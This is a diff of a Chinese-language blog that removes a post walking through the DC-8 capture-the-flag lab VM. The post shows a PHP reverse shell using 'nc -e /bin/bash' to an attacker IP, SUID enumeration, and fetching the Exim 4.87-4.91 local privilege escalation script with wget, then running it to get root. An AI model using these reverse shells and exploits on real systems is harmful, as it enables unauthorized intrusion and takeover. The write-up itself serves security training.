-<h2 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h2><p>一点点找有用的线索，这里发现了<code>webform</code>可以编辑<br><img src="/assets/Pasted%20image%2020260112165158.png"><br>可以选择<code>php</code>语言，我们思考可以<code>nc</code>反弹<br><img src="/assets/Pasted%20image%2020260112165639.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/bash 192.168.3.37 1111&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>一般可以查看内核信息<code>uname -a</code> 或者查看定时任务 <code>cat /etc/crontab</code> ，本题无相关信息。</p>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lp 1111          </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span></span><br><span class="line">www-data@dc-8:/var/www/html$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
-
-<p><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;);&quot;</code> &#x3D;&#x3D;稳定shell&#x3D;&#x3D;</p>
-<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>这条命令的核心作用是：<strong>从根目录开始递归遍历，查找所有「文件所有者为 root」且「权限位包含 SUID（4000）」的文件，将符合条件的文件路径打印到终端，并屏蔽所有错误信息</strong>。</p>
-<p><code>-user root</code>:<br>查找条件 1：限定文件的<strong>所有者（属主）为 root 用户</strong>（仅匹配 root 拥有的文件，排除其他用户的文件）。</p>
-<p><code>-perm -4000</code>:<br>查找条件 2：限定文件权限中<strong>至少包含 SUID 特殊权限（权限标识 4000）</strong>，这是命令的核心参数：</p>
-<ol>
-<li><code>perm</code>：用于匹配文件的权限模式（数字权限或符号权限）；</li>
-<li>前缀 <code>-</code>：表示「文件权限包含该权限位即可」，无需完全匹配（如文件权限为 <code>4755</code>，包含 <code>4000</code>，符合条件）；</li>
-<li><code>4000</code>：对应 <strong>SUID（Set UID）特殊权限</strong>（所有者的 Set UID 位）。</li>
-</ol>
-<h4 id="查看exim4版本"><a href="#查看exim4版本" class="headerlink" title="查看exim4版本"></a>查看exim4版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/var/www/html$ /usr/sbin/exim4 --version</span><br><span class="line">/usr/sbin/exim4 --version</span><br><span class="line">Exim version 4.89 <span class="comment">#2 built 14-Jun-2017 05:03:07</span></span><br><span class="line">Copyright (c) University of Cambridge, 1995 - 2017</span><br><span class="line">(c) The Exim Maintainers and contributors <span class="keyword">in</span> ACKNOWLEDGMENTS file, 2007 - 2017</span><br><span class="line">Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)</span><br><span class="line">Support <span class="keyword">for</span>: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open</span><br><span class="line">Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd</span><br><span class="line">Authenticators: cram_md5 plaintext</span><br><span class="line">Routers: accept dnslookup ipliteral manualroute queryprogram redirect</span><br><span class="line">Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp</span><br><span class="line">Fixed never_users: 0</span><br><span class="line">Configure owner: 0:0</span><br><span class="line">Size of off_t: 8</span><br><span class="line">Configuration file is /var/lib/exim4/config.autogenerated</span><br><span class="line">www-data@dc-8:/var/www/html$ </span><br></pre></td></tr></table></figure>
-<p><code>/usr/sbin/exim4 --version</code><br>查看版本 <code>Exim version 4.89</code></p>
-<blockquote>
-<p>[!NOTE] exim4<br><code>/usr/sbin/exim4</code> 是 <strong>Debian&#x2F;Ubuntu&#x2F;Kali 等 Debian 系 Linux 发行版中，Exim 邮件传输代理（MTA）的专属可执行程序</strong>，核心用于系统邮件的发送、接收与路由，在 CTF 靶机场景中常作为提权突破口;<code>exim4</code> 是 Exim（Extended Internet Mailer）的 Debian 定制版本，与原生 Exim 功能一致，仅在配置文件结构、包管理方式上有细微差异（简化了复杂配置，更适合 Debian 系系统）</p>
-</blockquote>
-<h4 id="kali-searchsploit"><a href="#kali-searchsploit" class="headerlink" title="kali searchsploit"></a>kali searchsploit</h4><p>前面找到具有<code>SUID</code>的文件<code>exim4</code>，但是<code>exim4</code>搜索结果只有一个漏洞，而且不知道版本，因此这里直接搜索<code>searchsploit exim</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/www/html]</span><br><span class="line">└─# searchsploit exim </span><br><span class="line">Exim 4.87 - 4.91 - Local Privilege Escalation  | linux/local/46996.sh</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<p><img src="/assets/Pasted%20image%2020260112202617.png"></p>
-<p> <strong>文件路径</strong> : <code>/usr/share/exploitdb/exploits/linux/local/46996.sh</code><br><img src="/assets/Pasted%20image%2020260112204519.png"></p>
-<h4 id="发送a-sh"><a href="#发送a-sh" class="headerlink" title="发送a.sh"></a>发送a.sh</h4><p>复制到当前目录，然后改名<code>a.sh</code>，方便<code>http</code>发送接收</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload/DC8]</span><br><span class="line">└─# <span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/46996.sh . <span class="comment">#拷贝到当前目录</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload/DC8]</span><br><span class="line">└─# <span class="built_in">ls</span> -l</span><br><span class="line">总计 8</span><br><span class="line">-rwxr-xr-x 1 root root 3552  1月12日 20:34 46996.sh</span><br><span class="line">-rw-r--r-- 1 root root   56  1月12日 16:33 hash.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload/DC8]</span><br><span class="line">└─# <span class="built_in">mv</span> 46996.sh a.sh</span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload/DC8]</span><br><span class="line">└─# <span class="built_in">ls</span> -l</span><br><span class="line">总计 8</span><br><span class="line">-rwxr-xr-x 1 root root 3552  1月12日 20:34 a.sh</span><br><span class="line">-rw-r--r-- 1 root root   56  1月12日 16:33 hash.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload/DC8]</span><br><span class="line">└─# python3 -m http.server 8000                            </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">192.168.3.47 - - [12/Jan/2026 20:40:45] <span class="string">&quot;GET /a.sh HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
-
-<h4 id="接收a-sh"><a href="#接收a-sh" class="headerlink" title="接收a.sh"></a>接收a.sh</h4><ul>
-<li><code>wget</code> 下<code>a.sh</code></li>
-<li>授予执行权限<code>chmod +x a.sh</code> </li>
-<li>执行<code>./a.sh -m netcat</code></li>
-<li>等待5秒即可<code>id</code></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ wget http://192.168.3.48:8000/a.sh</span><br><span class="line">wget http://192.168.3.48:8000/a.sh</span><br><span class="line">--2026-01-12 22:40:45--  http://192.168.3.48:8000/a.sh</span><br><span class="line">Connecting to 192.168.3.48:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3552 (3.5K) [application/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;a.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">a.sh                100%[===================&gt;]   3.47K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2026-01-12 22:40:45 (367 MB/s) - <span class="string">&#x27;a.sh&#x27;</span> saved [3552/3552]</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ <span class="built_in">ls</span> -l</span><br><span class="line"><span class="built_in">ls</span> -l</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 www-data www-data 3552 Jan 12 22:34 a.sh</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ <span class="built_in">chmod</span> +x a.sh</span><br><span class="line"><span class="built_in">chmod</span> +x a.sh</span><br><span class="line">www-data@dc-8:/tmp$ ./a.sh -m netcat</span><br><span class="line">./a.sh -m netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">&quot;The Return of the WIZard&quot;</span> LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Mon, 12 Jan 2026 22:48:06 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with <span class="string">&quot;.&quot;</span> on a line by itself</span><br><span class="line">250 OK <span class="built_in">id</span>=1vfHL4-0000G7-8o</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=113(Debian-exim) <span class="built_in">groups</span>=113(Debian-exim)</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888</span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888</span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888</span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888</span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span></span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;m also sending out an especially big thanks to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@4nqr34z</span></span><br><span class="line"><span class="string">@D4mianWayne</span></span><br><span class="line"><span class="string">@0xmzfr</span></span><br><span class="line"><span class="string">@theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This challenge was largely based on two things:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</span></span><br><span class="line"><span class="string">2. A suggestion from @theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The answer to that question is...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>[!NOTE] 提示<br>这里的<code>root</code>权限大概持续一分钟，之后又返回普通权限，但是在这一分钟时间里可以做很多事情，如添加账号、关闭服务等。</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2021,7 +2053,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2034,7 +2066,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
